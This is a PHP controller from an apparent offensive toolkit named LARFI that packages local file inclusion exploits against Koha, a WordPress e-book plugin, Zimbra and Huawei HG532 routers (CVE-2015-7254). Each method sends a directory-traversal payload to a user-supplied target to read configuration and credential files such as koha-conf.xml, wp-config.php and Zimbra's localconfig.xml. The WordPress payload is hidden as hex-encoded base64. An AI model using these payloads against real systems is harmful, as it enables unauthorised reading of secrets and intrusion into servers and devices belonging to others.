<?php
/**
 Purpose: Serve as Plugins Based on LARFI (Local and Remote File Inclusion)
    
    Copyright (c) 2015 ~ alienwithin
    Munir Njiru <munir@skilledsoft.com>
 
        @version 1.0.0
        @date: 30.06.2015
        @url : http://munir.skilledsoft.com
 **/
namespace Controller;
/**
 * Creates Exploits based on LARFI
 * Class Lfiplugins
 * @package Controller
 */
class Lfiplugins extends Larfi {
    /**
     * Initialize the View
     */
	public function beforeroute() {
		$this->response = new \View\Backend();
		$this->response->data['LAYOUT'] = 'larfi_layout.html';
	}

    /**
     * Koha Cookie Based LFI Example
     * @param \Base $f3
     */
	public function koha_lfi(\Base $f3){
		$lfi=new Larfi();
		$f3->set('exploit_title', 'Koha Liblime <= 4.2');
		$this->response->data['SUBPART'] = 'lfi_page.html';
		$blankurl=$f3->devoid('POST.url');
		$url=rtrim($f3->get('POST.url'),"/")."/cgi-bin/koha/opac-main.pl";
		$method="GET";
		$payload="KohaOpacLanguage=../../../../../../../../etc/koha/koha-conf.xml%00";
		return $this->cookie_based_lfi($method,$blankurl,$url,$payload);
	}

    /**
     * Wordpress Aspose E-Book Generator URIL Based LFI
     * @param \Base $f3
     */
	public function wordpress_lfi(\Base $f3){
		$lfi=new Larfi();
		$f3->set('exploit_title', 'Wordpress E-Book Generator LFI');
		$this->response->data['SUBPART'] = 'lfi_page.html';
		$blankurl=$f3->devoid('POST.url');
		$url=$f3->get('POST.url');
		$Negotiate_terms_with_robber="\x4c\x33\x64\x77\x4c\x57\x4e\x76\x62\x6e\x52\x6c\x62\x6e\x51\x76\x63\x47\x78\x31\x5a\x32\x6c\x75\x63\x79\x39\x68\x63\x33\x42\x76\x63\x32\x55\x74\x59\x32\x78\x76\x64\x57\x51\x74\x5a\x57\x4a\x76\x62\x32\x73\x74\x5a\x32\x56\x75\x5a\x58\x4a\x68\x64\x47\x39\x79\x4c\x32\x46\x7a\x63\x47\x39\x7a\x5a\x56\x39\x77\x62\x33\x4e\x30\x63\x31\x39\x6c\x65\x48\x42\x76\x63\x6e\x52\x6c\x63\x6c\x39\x6b\x62\x33\x64\x75\x62\x47\x39\x68\x5a\x43\x35\x77\x61\x48\x41\x2f\x5a\x6d\x6c\x73\x5a\x54\x30\x75\x4c\x69\x38\x75\x4c\x69\x38\x75\x4c\x69\x39\x33\x63\x43\x31\x6a\x62\x32\x35\x6d\x61\x57\x63\x75\x63\x47\x68\x77";
		$payload=base64_decode($Negotiate_terms_with_robber);
		return $this->uri_based_lfi($blankurl,$url,$payload);

	}

    /**
     * Zimbra Collaboration Server URI Based LFI
     * @param \Base $f3
     */
	public function zimbra_lfi(\Base $f3){
		$lfi=new Larfi();
		$f3->set('exploit_title', 'Zimbra Collaboration server LFI (Versions: <=7.2.2 and <=8.0.2 )');
		$this->response->data['SUBPART'] = 'lfi_page.html';
		$blankurl=$f3->devoid('POST.url');
		$url=$f3->get('POST.url');
		$payload="/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00";
		return $this->uri_based_lfi($blankurl,$url,$payload);

	}
    /**
     * Huawei_lfi
     * cve-2015-7254
     * Directory traversal vulnerability on Huawei HG532e, HG532n, and HG532s devices allows remote attackers to read arbitrary files via a .. (dot dot) in an icon/ URI.
     * @param \Base $f3
     * Alternative file read: http://<target_IP>:37215/icon/../../../etc/inittab.
     */
    public function huawei_lfi(\Base $f3){
        $lfi=new Larfi();
        $f3->set('exploit_title', 'HUAWEI LFI (cve-2015-7254) Huawei HG532e, HG532n, & HG532s');
        $this->response->data['SUBPART'] = 'lfi_page.html';
		$blankurl=$f3->devoid('POST.url');
        $url=$f3->get('POST.url');
        $payload=":37215/icon/../../../etc/defaultcfg.xml";
        return $this->uri_based_lfi($blankurl,$url,$payload);

    }
	
	
}